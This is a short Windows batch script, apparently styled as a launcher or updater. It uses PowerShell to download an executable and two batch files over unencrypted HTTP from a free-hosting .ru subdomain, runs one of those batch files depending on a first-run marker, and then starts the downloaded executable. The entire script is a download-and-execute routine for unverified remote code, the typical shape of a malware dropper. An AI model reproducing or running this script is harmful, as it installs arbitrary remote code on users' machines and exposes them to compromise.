@echo off

mkdir lib
powershell -command "& { (New-Object System.Net.WebClient).DownloadFile('http://a0931945.xsph.ru/launcher.exe', '.\lib\launcher.exe');(New-Object System.Net.WebClient).DownloadFile('http://a0931945.xsph.ru/updater.bat', '.\lib\updater.bat');(New-Object System.Net.WebClient).DownloadFile('http://a0931945.xsph.ru/updatern.bat', '.\lib\updatern.bat')}"
if not exist "%USERPROFILE%\first_run.txt" (
    start "" /wait "%USERPROFILE%\Downloads\lib\updater.bat"
    echo First run completed. > "%USERPROFILE%\first_run.txt"
) else (
    start "" "%USERPROFILE%\Downloads\lib\updatern.bat"
)
powershell -command "& { Start-Process -FilePath '.\lib\launcher.exe' }"
